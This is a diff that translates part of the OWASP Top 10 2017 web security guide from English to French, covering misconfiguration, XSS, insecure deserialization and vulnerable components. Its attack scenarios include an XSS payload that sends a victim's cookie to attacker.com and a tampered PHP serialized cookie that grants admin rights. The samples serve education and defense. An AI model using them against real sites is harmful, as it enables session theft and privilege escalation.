-<li>The security settings in the application servers, application frameworks (e.g. Struts, Spring, ASP.NET), libraries, databases, etc. not set to secure values.</li>
-<li>The server does not send security headers or directives or they are not set to secure values.</li>
-<li>The software is out of date or vulnerable (see <strong>A9:2017-Using Components with Known Vulnerabilities</strong>).</li>
+<li>elle n'a pas fait l'objet d'un durcissement sécurité approprié sur l'ensemble des couches protocolaires applicatives, ou si les permissions sont mal configurées sur les services cloud.</li>
+<li>des fonctionnalités inutiles sont activées ou installées (ex. des ports, des services, des pages, des comptes ou des privilèges inutiles).</li>
+<li>les comptes par défaut et leurs mots de passe sont toujours activés et inchangés.</li>
+<li>le traitement des erreurs révèle aux utilisateurs des traces des piles protocolaires ou d'autres messages d'erreur laissant transpirer trop d'informations.</li>
+<li>pour les systèmes à jour ou mis à niveau, les dernières fonctionnalités de sécurité sont désactivées ou ne sont pas configurées de manière sécurisée.</li>
+<li>les paramètres de sécurité dans les serveurs d'application, les frameworks applicatifs (ex. Struts, Spring, ASP.NET), les bibliothèques, les bases de données, etc. ne sont pas paramétrés avec des valeurs correctes du point de vue de la sécurité.</li>
+<li>le serveur n'envoie pas d'en-têtes ou de directives de sécurité, ou s'ils ne sont pas paramétrés avec des valeurs correctes du point de vue de la sécurité.</li>
+<li>La version du logiciel est obsolète ou vulnérable (voir <strong>A9:2017 Utilisation de Composants avec des Vulnérabilités Connues</strong>).</li>
 </ul>
-<p>Without a concerted, repeatable application security configuration process, systems are at a higher risk.</p>
-<h2>How To Prevent</h2>
-<p>Secure installation processes should be implemented, including:</p>
+<p>Sans un processus concerté et répétable de configuration de la sécurité des applications, les systèmes courent un risque plus élevé.</p>
+<h2>Comment s'en Prémunir</h2>
+<p>Des processus d'installation sécurisés doivent être mis en œuvre, avec notamment :</p>
 <ul>
-<li>A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. This process should be automated to minimize the effort required to setup a new secure environment.</li>
-<li>A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.</li>
-<li>A task to review and update the configurations appropriate to all security notes, updates and patches as part of the patch management process (see <strong>A9:2017-Using Components with Known Vulnerabilities</strong>). In particular, review cloud storage permissions (e.g. S3 bucket permissions).</li>
-<li>A segmented application architecture that provides effective, secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).</li>
-<li>Sending security directives to clients, e.g. <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project">Security Headers</a>.</li>
-<li>An automated process to verify the effectiveness of the configurations and settings in all environments.</li>
+<li><p>Un processus de durcissement répétable qui permette de déployer rapidement et facilement un autre environnement correctement sécurisé avec une configuration verrouillée. Les environnements de développement, d'assurance qualité et de production doivent tous être configurés de manière identique, avec des droits différents pour chaque environnement. Ce processus devrait être automatisé afin de réduire au minimum les efforts requis pour mettre en place un nouvel environnement sécurisé.</p></li>
+<li><p>Une plate-forme minimale sans fonctionnalités, composants, documentation et échantillons inutiles. Supprimez ou n'installez pas les fonctionnalités et frameworks inutilisés.</p></li>
+<li><p>Une tâche pour revoir et mettre à jour les configurations appropriées à tous les avis de sécurité, toutes les mises à jour et tous les correctifs dans le cadre du processus de gestion des correctifs (voir <strong>A9:2017 Utilisation de Composants avec des Vulnérabilités Connues</strong>). En particulier, examinez les permissions de stockage dans le Cloud (ex. les permissions des buckets AWS S3).</p></li>
+<li><p>Une architecture d'application segmentée qui fournit une séparation efficace et sécurisée entre les composants ou les environnement hébergés, avec de la segmentation, de la mise en conteneurs ou l'utilisation de groupes de sécurité dans le Cloud (ACL).</p></li>
+<li><p>L'envoi de directives de sécurité aux clients, par exemple [En-têtes de sécurité] (<a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project" class="uri">https://www.owasp.org/index.php/OWASP_Secure_Headers_Project</a>).</p></li>
+<li><p>Un processus automatisé pour vérifier l'efficacité des configurations et des réglages dans tous les environnements.</p></li>
 </ul>
-<h2>Example Attack Scenarios</h2>
-<p><strong>Scenario #1</strong>: The application server comes with sample applications that are not removed from the production server. These sample applications have known security flaws attackers use to compromise the server. If one of these applications is the admin console, and default accounts weren't changed the attacker logs in with default passwords and takes over.</p>
-<p><strong>Scenario #2</strong>: Directory listing is not disabled on the server. An attacker discovers they can simply list directories. The attacker finds and downloads the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a serious access control flaw in the application.</p>
-<p><strong>Scenario #3</strong>: The application server's configuration allows detailed error messages, e.g. stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.</p>
-<p><strong>Scenario #4</strong>: A cloud service provider has default sharing permissions open to the Internet by other CSP users. This allows sensitive data stored within cloud storage to be accessed.</p>
-<h2>References</h2>
+<h2>Exemple de Scénario d'Attaque</h2>
+<p><strong>Scénario #1</strong> : Le serveur d'application est livré avec des applications classiques qui ne sont pas supprimées du serveur mis en production. Ces mêmes applications ont des failles de sécurité connues que les attaquants utilisent afin de compromettre le serveur. Si l'une de ces applications est la console d'administration, et que les comptes par défaut n'ont pas été modifiés, l'attaquant se connecte avec les mots de passe par défaut et prend la main sur la cible.</p>
+<p><strong>Scénario #2</strong>** : La fonctionnalité de listage des répertoires n'est pas désactivée sur le serveur. Un attaquant découvre qu'il peut simplement lister les répertoires. L'attaquant trouve et télécharge les classes Java compilées, qu'il décompose et fait l'ingéniérie inversée pour visualiser le code. L'attaquant trouve alors un grave défaut dans le contrôle d'accès de l'application.</p>
+<p><strong>Scénario #3</strong>: La configuration du serveur d'application permet de renvoyer aux utilisateurs des messages d'erreur détaillés, par exemple avec des traces des couches protocolaires applicatives. Cela peut ainsi exposer des informations sensibles ou des vulnérabilités sous-jacentes telles que les versions de composants dont on sait qu'elles sont vulnérables.</p>
+<p><strong>Scénario #4</strong>: Un fournisseur de services Cloud (CSP) a positionné des droits de partage par défaut qui sont ouverts sur Internet par d'autres utilisateurs du CSP. Cela permet d'accéder à des données sensibles stockées dans le stockage Cloud.</p>
+<h2>Références</h2>
 <h3>OWASP</h3>
 <ul>
 <li><a href="https://www.owasp.org/index.php/Testing_for_configuration_management">OWASP Testing Guide: Configuration Management</a></li>
 <li><a href="https://www.owasp.org/index.php/Testing_for_Error_Code_(OWASP-IG-006)">OWASP Testing Guide: Testing for Error Codes</a></li>
 <li><a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project">OWASP Security Headers Project</a></li>
 </ul>
-<p>For additional requirements in this area, see the Application Security Verification Standard <a href="https://www.owasp.org/index.php/ASVS_V19_Configuration">V19 Configuration</a>.</p>
-<h3>External</h3>
+<p>Pour des exigences supplémentaires dans ce domaine, voir la Norme de vérification de la sécurité des applications : Application Security Verification Standard <a href="https://www.owasp.org/index.php/ASVS_V19_Configuration">V19 Configuration</a>.</p>
+<h3>Externes</h3>
 <ul>
 <li><a href="https://csrc.nist.gov/publications/detail/sp/800-123/final">NIST Guide to General Server Hardening</a></li>
 <li><a href="https://cwe.mitre.org/data/definitions/2.html">CWE-2: Environmental Security Flaws</a></li>
@@ -733,64 +707,64 @@
 </colgroup>
 <thead>
 <tr class="header">
-<th>Threat agents/Attack vectors</th>
-<th>Security Weakness</th>
+<th>Facteurs de Menace/Vecteurs d'Attaque</th>
+<th>Vulnérabilités</th>
 <th>Impacts</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Access Lvl : Exploitability 3</td>
-<td>Prevalence 3 : Detectability 3</td>
-<td>Technical 2 : Business</td>
+<td>Accès Lvl : Exploitation 3</td>
+<td>Fréquence 3 : Détection 3</td>
+<td>Techniques 2 : Métier ?</td>
 </tr>
 <tr class="even">
-<td>Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks.</td>
-<td>XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET.</td>
-<td>The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.</td>
+<td>Des outils automatisés permettent de détecter et d'exploiter les trois types de XSS et des frameworks d'exploitation gratuits sont disponibles.</td>
+<td>XSS est le deuxième problème le plus fréquent de l'OWASP Top 10 et on le retrouve dans près de 2/3 des applications. Les outils automatisés peuvent trouver automatiquement quelques failles XSS, en particulier dans des technologies matures telles que PHP, JEE / JSP, et ASP.NET.</td>
+<td>L'impact de XSS est modéré pour les &quot;XSS basés sur DOM&quot; et les &quot;XSS Réfléchis&quot;, et grave pour les &quot;XSS Stockés&quot;, avec des exécutions à distance dans le navigateur de la victime, comme du vol de comptes d'accès, de sessions, ou de la distribution de logiciel malveillant à la victime.</td>
 </tr>
 </tbody>
 </table>
-<h2>Is the Application Vulnerable?</h2>
-<p>There are three forms of XSS, usually targeting users' browsers:</p>
+<h2>Suis-je Vulnérable ?</h2>
+<p>Il y a trois types de XSS, ciblant habituellement les navigateurs de victimes:</p>
 <ul>
-<li><strong>Reflected XSS</strong>: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.</li>
-<li><strong>Stored XSS</strong>: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.</li>
-<li><strong>DOM XSS</strong>: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.</li>
+<li><strong>XSS Réfléchi</strong>: L'application ou l'API copie les entrées utilisateur, sans validation ni contrôle des caractères spéciaux, comme partie intégrante de la sortie HTML. Une attaque réussie permet à l'attaquant d'exécuter du HTML et du JavaScript arbitraire dans le navigateur de la victime. Typiquement, l'utilisateur devra interagir avec un lien malicieux redirigeant vers une page contrôlée par l'attaquant, comme un site web malicieux de type &quot;point d'eau&quot;, publicitaire, ou équivalent.</li>
+<li><strong>XSS Stocké</strong>: L'application ou l'API stocke des entrées utilisateur, ni contrôlées ni assainies, qui seront vues ultérieurement par un autre utilisateur ou un administrateur. Ces XSS stockés sont souvent considérés comme un risque élevé, voire critique.</li>
+<li><strong>XSS basé sur DOM</strong>: Les environnements JavaScript, les applications monopage, et les APIs qui intègrent dynamiquement à la page, des données contrôlables par l'attaquant, sont vulnérables au XSS basé sur DOM. En règle générale, l'application ne doit pas transmettre de données contrôlables par l'attaquant à des APIs Javascript non sûres.</li>
 </ul>
-<p>Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.</p>
-<h2>How To Prevent</h2>
-<p>Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:</p>
+<p>Les attaques habituelles de type XSS sont le vol de session, la prise de contrôle de compte, le contournement MFA, le remplacement ou le défacement de noeud DOM (comme des fenêtres de connexion-cheval de troie), des attaques du navigateur de l'utilisateur tels que des téléchargements de maliciels, des enregistreurs de frappe et autres attaques du client.</p>
+<h2>Comment s'en Prémunir ?</h2>
+<p>Se protéger des attaques XSS nécessite la séparation des données non sûres du contenu actif du navigateur. Pour cela:</p>
 <ul>
-<li>Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.</li>
-<li>Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP Cheat Sheet 'XSS Prevention'</a> has details on the required data escaping techniques.</li>
-<li>Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.</li>
-<li>Enabling a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a> as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).</li>
+<li>Utiliser des frameworks avec des techniques automatiques d'échappements XSS par conception, comme les dernières versions de Ruby on Rails et React JS. Regarder les limitations de protection XSS de votre framework et prendre les mesures appropriées pour couvrir les cas non gérés.</li>
+<li>Appliquer des techniques d'échappement aux données des requêtes HTTP non sûres, selon le contexte des sorties HTML dans lequel elles seront insérées (body, attribute, JavaScript, CSS, ou URL). Cela résoudra les vulnérabilités des XSS Réfléchis ou Stockés. L'<a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">Aide-mémoire de l'OWASP 'Prévention des XSS'</a> donne des détails sur les techniques requises d'échappement des données.</li>
+<li>Appliquer un encodage adapté au contexte lors des modifications des documents du navigateur du client est une protection contre les XSS basés sur DOM. Quand cela ne peut être évité, des techniques d'échappement, adaptées au contexte, peuvent être appliquées aux APIs du navigateur comme indiqué dans l'<a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">Aide-mémoire de l'OWASP 'Prévention des XSS basés sur DOM'</a>.</li>
+<li>Etablir une <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Politique de Sécurité du Contenu (CSP)</a> comme mesure de défense-en-profondeur limitant les attaques XSS. Cela sera efficace s'il n'y a pas d'autre vulnérabilité qui permettrait de déposer du code malicieux par insertion de fichier en local (e.x. écrasement par attaque de type &quot;traversée de répertoire&quot; ou via des bibliothèques vulnérables des réseaux de diffusion de contenu (CDN) autorisés).</li>
 </ul>
-<h2>Example Attack Scenario</h2>
-<p><strong>Scenario #1</strong>: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</p>
-<p><code>(String) page += &quot;&lt;input name='creditcard' type='TEXT' value='&quot; + request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;;</code> The attacker modifies the ‘CC’ parameter in the browser to:</p>
-<p><code>'&gt;&lt;script&gt;document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'</code></p>
-<p>This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.</p>
-<p><strong>Note</strong>: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.</p>
-<h2>References</h2>
+<h2>Exemple de Scénario d'Attaque</h2>
+<p><strong>Scénario #1</strong>: L'application utilise des données non sûres dans la construction du fragment de code HTML sans validation ni technique d'échappement:</p>
+<p><code>(String) page += &quot;&lt;input name='creditcard' type='TEXT' value='&quot; + request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;;</code></p>
+<p>L'attaquant remplace le paramètre ‘CC’ du navigateur par: <code>'&gt;&lt;script&gt;document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'</code></p>
+<p>Cette attaque envoie l'ID de session de la victime vers le site web de l'attaquant, lui permettant ainsi de détourner la session active de l'utilisateur.</p>
+<p><strong>Note</strong>: Les attaquants peuvent utiliser XSS pour invalider les défenses automatisées anti Falsification-de-requête-intersite (CSRF) que l'application peut avoir mises en place.</p>
+<h2>Références</h2>
 <h3>OWASP</h3>
 <ul>
-<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Proactive Controls: Encode Data</a></li>
-<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Proactive Controls: Validate Data</a></li>
-<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard: V5</a></li>
-<li><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">OWASP Testing Guide: Testing for Reflected XSS</a></li>
-<li><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">OWASP Testing Guide: Testing for Stored XSS</a></li>
-<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">OWASP Testing Guide: Testing for DOM XSS</a></li>
-<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP Cheat Sheet: XSS Prevention</a></li>
-<li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">OWASP Cheat Sheet: DOM based XSS Prevention</a></li>
-<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP Cheat Sheet: XSS Filter Evasion</a></li>
-<li><a href="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project">OWASP Java Encoder Project</a></li>
+<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Contrôles Proactifs: Encoder les Données</a></li>
+<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Contrôles Proactifs: Valider les Données</a></li>
+<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Standard de Vérification de la Sécurité des Applications: V5</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">OWASP Guide de Test: Test des XSS Réfléchis</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">OWASP Guide de Test: Test des XSS Stockés</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">OWASP Guide de Test: Test des XSS basés sur DOM</a></li>
+<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP Aide-Mémoire: Prévention du XSS</a></li>
+<li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">OWASP Aide-Mémoire: Prévention du XSS basé sur DOM</a></li>
+<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP Aide-Mémoire: Contournements de Filtres XSS</a></li>
+<li><a href="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project">OWASP Projet Java Encodeur</a></li>
 </ul>
-<h3>External</h3>
+<h3>Externes</h3>
 <ul>
-<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper neutralization of user supplied input</a></li>
-<li><a href="https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection">PortSwigger: Client-side template injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Neutralisation incorrecte des entrées utilisateurs</a></li>
+<li><a href="https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection">PortSwigger: Modèle d'injection côté Client</a></li>
 </ul>
 <h1>A8:2017 Insecure Deserialization</h1>
 <table>
@@ -801,56 +775,57 @@
 </colgroup>
 <thead>
 <tr class="header">
-<th>Threat agents/Attack vectors</th>
-<th>Security Weakness</th>
+<th>Agents de menaces/Vecteurs d'attaques</th>
+<th>Vulnérabilité</th>
 <th>Impacts</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Access Lvl : Exploitability 1</td>
-<td>Prevalence 2 : Detectability 2</td>
-<td>Technical 3 : Business</td>
+<td>Niveau d'accès : Exploitation 1</td>
+<td>Fréquence 2 : Détection 2</td>
+<td>Technique 3 : Métier</td>
 </tr>
 <tr class="even">
-<td>Exploitation of deserialization is somewhat difficult, as off the shelf exploits rarely work without changes or tweaks to the underlying exploit code.</td>
-<td>This issue is included in the Top 10 based on an <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">industry survey</a> and not on quantifiable data. Some tools can discover deserialization flaws, but human assistance is frequently needed to validate the problem. It is expected that prevalence data for deserialization flaws will increase as tooling is developed to help identify and address it.</td>
-<td>The impact of deserialization flaws cannot be overstated. These flaws can lead to remote code execution attacks, one of the most serious attacks possible. The business impact depends on the protection needs of the application and data.</td>
+<td>Il arrive que l'exploitation d'une désérialisation soit difficile car les codes d'exploitation génériques fonctionnent rarement sans une adaptation à l'application ciblée.</td>
+<td>Cette vulnérabilité est incluse dans le Top 10 <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">sur la base d'un questionnaire rempli par des professionnels de la sécurité</a> et non sur des données quantifiables. Certains outils peuvent détecter des erreurs de désérialisation, mais une assistance humaine est souvent nécessaire pour valider le problème. Il faut s'attendre à une augmentation des défauts de désérialisation trouvés dans les applications à mesure que des outils sont développés pour aider à les identifier et à y remédier.</td>
+<td>L'impact des erreurs de désérialisation ne doit pas être sous-estimé. Ces failles peuvent conduire à des attaques d'exécution de code à distance, l'une des attaques les plus graves qui soient. L'impact métier dépend des besoins de protection de l'application et des données.</td>
 </tr>
 </tbody>
 </table>
-<h2>Is the Application Vulnerable?</h2>
-<p>Applications and APIs will be vulnerable if they deserialize hostile or tampered objects supplied by an attacker.</p>
-<p>This can result in two primary types of attacks:</p>
+<h2>Suis-je vulnérable aux défauts de désérialisation?</h2>
+<p>Les applications et les API seront vulnérables si elles désérialisent des objets hostiles ou altérés fournis par un attaquant.</p>
+<p>Cela peut entraîner deux principaux types d'attaques:</p>
 <ul>
-<li>Object and data structure related attacks where the attacker modifies application logic or achieves arbitrary remote code execution if there are classes available to the application that can change behavior during or after deserialization.</li>
-<li>Typical data tampering attacks such as access-control-related attacks where existing data structures are used but the content is changed.</li>
+<li><p>Attaques liées aux objets et à la structure de données où l'attaquant modifie la logique de l'application ou exécute du code arbitraire. Pour cela, il doit exister des classes dans l'application qui peuvent modifier le comportement pendant ou après la désérialisation.</p></li>
+<li><p>Attaques par falsification de données lorsque des structures sérialisées sont utilisées pour du contrôle d'accès et que le contenu est modifié par l'attaquant.</p></li>
 </ul>
-<p>Serialization may be used in applications for:</p>
+<p>La sérialisation peut être utilisée dans des applications pour:</p>
 <ul>
-<li>Remote- and inter-process communication (RPC/IPC)</li>
-<li>Wire protocols, web services, message brokers</li>
-<li>Caching/Persistence</li>
-<li>Databases, cache servers, file systems</li>
-<li>HTTP cookies, HTML form parameters, API authentication tokens</li>
+<li>Communication distante et inter-processus (RPC/IPC)</li>
+<li>Protocoles connectés, Web services, message brokers</li>
+<li>Mise en cache / Persistance</li>
+<li>Bases de données, serveurs de cache, systèmes de fichiers</li>
+<li>Cookies HTTP, paramètres de formulaire HTML, jetons d'authentification API</li>
 </ul>
-<h2>How To Prevent</h2>
-<p>The only safe architectural pattern is not to accept serialized objects from untrusted sources or to use serialization mediums that only permit primitive data types.</p>
-<p>If that is not possible, consider one of more of the following:</p>
+<h2>Comment l'empêcher</h2>
+<p>La seule architecture logicielle sûre est de ne pas accepter les objets sérialisés provenant de sources non fiables ou d'utiliser des supports de sérialisation qui autorisent uniquement les types de données primitifs.</p>
+<p>Si ce n'est pas possible, envisagez l'une des solutions suivantes:</p>
 <ul>
-<li>Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.</li>
-<li>Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.</li>
-<li>Isolating and running code that deserializes in low privilege environments when possible.</li>
-<li>Log deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.</li>
-<li>Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.</li>
-<li>Monitoring deserialization, alerting if a user deserializes constantly.</li>
+<li>Implémenter des contrôles d'intégrité tels que des signatures numériques sur tous les objets sérialisés pour empêcher la création d'objets dangereux ou la falsification de données.</li>
+<li>Appliquer des contraintes de typage fort lors de la désérialisation avant la création de l'objet car le code attend généralement un ensemble définissable de classes. Des contournements de cette technique ont été démontrés, il est donc déconseillé de se fier uniquement à elle.</li>
+<li>Isoler et exécuter le code qui désérialise dans des environnements à faible privilège lorsque cela est possible.</li>
+<li>Journaliser les exceptions et échecs de désérialisation, par exemple lorsque le type entrant n'est pas le type attendu, ou que la désérialisation génère des exceptions.</li>
+<li>Restreindre ou surveiller la connectivité réseau entrante et sortante des conteneurs ou des serveurs utilisés pour la désérialisation.</li>
+<li>Faire une surveillance des désérialisations, alerter si un utilisateur désérialise constamment.</li>
 </ul>
-<h2>Example Attack Scenarios</h2>
-<p><strong>Scenario #1</strong>: A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable. The solution they came up with is serializing user state and passing it back and forth with each request. An attacker notices the &quot;R00&quot; Java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server.</p>
-<p><strong>Scenario #2</strong>: A PHP forum uses PHP object serialization to save a &quot;super&quot; cookie, containing the user's user ID, role, password hash, and other state:</p>
+<h2>Exemples de scénarios d'attaque</h2>
+<p><strong>Scenario #1</strong>: Une application React appelle un ensemble de microservices Spring Boot. Sensibles à la programmation fonctionnelle, les développeurs essaient de s'assurer que leur code est immutable. La solution qu'ils ont trouvée consiste à sérialiser l'état de l'utilisateur et à le transmettre à chaque requête. Un attaquant remarque la signature d'objet Java &quot;R00&quot; et utilise <a href="https://github.com/NetSPI/JavaSerialKiller">l'outil Java Serial Killer</a> pour effectuer une exécution de code à distance sur le serveur d'applications.</p>
+<p><strong>Scenario #2</strong>: Un forum utilise la sérialisation des objets PHP pour enregistrer un cookie, contenant l'ID utilisateur, le rôle, le condensat du mot de passe et les autres attributs de l'utilisateur.</p>
 <p><code>a:4:{i:0;i:132;i:1;s:7:&quot;Mallory&quot;;i:2;s:4:&quot;user&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;}</code></p>
-<p>An attacker changes the serialized object to give themselves admin privileges: <code>a:4:{i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;}</code></p>
-<h2>References</h2>
+<p>Un attaquant modifie l'objet sérialisé pour se donner des privilèges d'administrateur:</p>
+<p><code>a:4:{i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;}</code></p>
+<h2>Références</h2>
 <h3>OWASP</h3>
 <ul>
 <li><a href="https://www.owasp.org/index.php/Deserialization_Cheat_Sheet">OWASP Cheat Sheet: Deserialization</a></li>
@@ -865,7 +840,7 @@
 <li><a href="https://github.com/mbechler/marshalsec">Java Unmarshaller Security</a></li>
 <li><a href="http://frohoff.github.io/appseccali-marshalling-pickles/">OWASP AppSec Cali 2015: Marshalling Pickles</a></li>
 </ul>
-<h1>A9:2017 Using Components with Known Vulnerabilities</h1>
+<h1>A9:2017 Utilisation de Composants avec des Vulnérabilités Connues</h1>
 <table>
 <colgroup>
 <col style="width: 33%" />
@@ -874,69 +849,69 @@
 </colgroup>
 <thead>
 <tr class="header">
-<th>Threat agents/Attack vectors</th>
-<th>Security Weakness</th>
+<th>Facteurs de Menace/Vecteurs d'Attaque</th>
+<th>Vulnérabilités</th>
 <th>Impacts</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Access Lvl : Exploitability 2</td>
-<td>Prevalence 3 : Detectability 2</td>
-<td>Technical 2 : Business</td>
+<td>Accès Lvl : Exploitation 2</td>
+<td>Fréquence 3 : Détection 2</td>
+<td>Techniques 2 : Métier ?</td>
 </tr>
 <tr class="even">
-<td>While it is easy to find already-written exploits for many known vulnerabilities, other vulnerabilities require concentrated effort to develop a custom exploit. </td>
-<td>Prevalence of this issue is very widespread. Component-heavy development patterns can lead to development teams not even understanding which components they use in their application or API, much less keeping them up to date. Some scanners such as retire.js help in detection, but determining exploitability requires additional effort.</td>
-<td>While some known vulnerabilities lead to only minor impacts, some of the largest breaches to date have relied on exploiting known vulnerabilities in components. Depending on the assets you are protecting, perhaps this risk should be at the top of the list.</td>
+<td>Bien qu'il soit facile de trouver des exploits prêts à l'emploi pour de multiples vulnérabilités, d'autres vulnérabilités demandent un effort soutenu pour développer un exploit adapté. </td>
+<td>La fréquence de ce problème est très élevée. Les modèles de développement à composants multiples peuvent conduire à ce que des équipes de développement ne sachent même pas quels composants ils utilisent dans leur application ou API, et soient donc encore moins susceptibles de les maintenir à jour. Des scanners comme retire.js aident à la détection, mais l'exploitation demande un effort supplémentaire.</td>
+<td>Alors que quelques vulnérabilités connues ont seulement des impacts mineurs, certaines des violations les plus importantes jusqu'à aujourd'hui reposent sur l'exploitation de vulnérabilités connues dans des composants. Suivant les actifs que vous avez à protéger, ce risque pourra être l'un de vos risques majeurs.</td>
 </tr>
 </tbody>
 </table>
-<h2>Is the Application Vulnerable?</h2>
-<p>You are likely vulnerable:</p>
+<h2>Suis-je Vulnérable ?</h2>
+<p>Vous êtes probablement vulnérable:</p>
 <ul>
-<li>If you do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.</li>
-<li>If software is vulnerable, unsupported, or out of date. This includes the OS, web/application server, database management system (DBMS), applications, APIs and all components, runtime environments, and libraries.</li>
-<li>If you do not scan for vulnerabilities regularly and subscribe to security bulletins related to the components you use.</li>
-<li>If you do not fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion. This commonly happens in environments when patching is a monthly or quarterly task under change control, which leaves organizations open to many days or months of unnecessary exposure to fixed vulnerabilities.</li>
-<li>If software developers do not test the compatibility of updated, upgraded, or patched libraries.</li>
